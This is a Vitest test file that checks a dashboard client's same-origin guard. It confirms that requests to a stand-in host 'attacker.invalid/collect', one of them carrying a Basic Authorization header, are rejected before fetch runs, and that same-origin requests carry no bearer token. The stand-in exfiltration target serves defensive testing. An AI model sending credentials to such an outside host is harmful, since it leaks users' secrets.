// @vitest-environment jsdom
//
// serverFetch same-origin guard (#3108): every dashboard endpoint is
// same-origin, and `credentials: 'same-origin'` governs only ambient cookies, so
// a caller-supplied Authorization header would ride along to ANY absolute URL.
// These tests pin the guard: cross-origin targets are rejected BEFORE fetch is
// invoked, while relative and same-origin absolute dashboard paths keep working.
// The browser stores and attaches no bearer token of its own (#3838).
import { afterEach, describe, expect, it, vi } from 'vitest';
import { serverFetch } from './api-client';

describe('serverFetch same-origin guard (#3108)', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('rejects a cross-origin absolute URL carrying an Authorization header, before fetch runs', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);

    await expect(
      serverFetch('https://attacker.invalid/collect', {
        headers: { Authorization: 'Basic c2VjcmV0' },
      })
    ).rejects.toThrow(/cross-origin/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rejects a cross-origin URL object, before fetch runs', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);

    await expect(
      serverFetch(new URL('https://attacker.invalid/collect'))
    ).rejects.toThrow(/cross-origin/);
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('rejects a protocol-relative cross-origin target', async () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal('fetch', fetchSpy);

    await expect(serverFetch('//attacker.invalid/collect')).rejects.toThrow(
      /cross-origin/
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('sends a relative /api request same-origin with no bearer token attached', async () => {
    const fetchSpy = vi.fn(async () => new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);
    try {
      sessionStorage.setItem(
        'claude-history-dashboard:enterprise-auth-token',
        'stale-enterprise-token'
      );
    } catch {
      /* sessionStorage may be disabled */
    }

    const res = await serverFetch('/api/live');

    expect(res.status).toBe(200);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
    const [input, init] = fetchSpy.mock.calls[0] as unknown as [
      RequestInfo | URL,
      RequestInit,
    ];
    expect(input).toBe('/api/live');
    expect(init.credentials).toBe('same-origin');
    expect(new Headers(init.headers).has('Authorization')).toBe(false);
    sessionStorage.clear();
  });

  it('allows a same-origin ABSOLUTE URL', async () => {
    const fetchSpy = vi.fn(async () => new Response('{}', { status: 200 }));
    vi.stubGlobal('fetch', fetchSpy);

    const res = await serverFetch(`${location.origin}/api/live`);

    expect(res.status).toBe(200);
    expect(fetchSpy).toHaveBeenCalledTimes(1);
  });
});
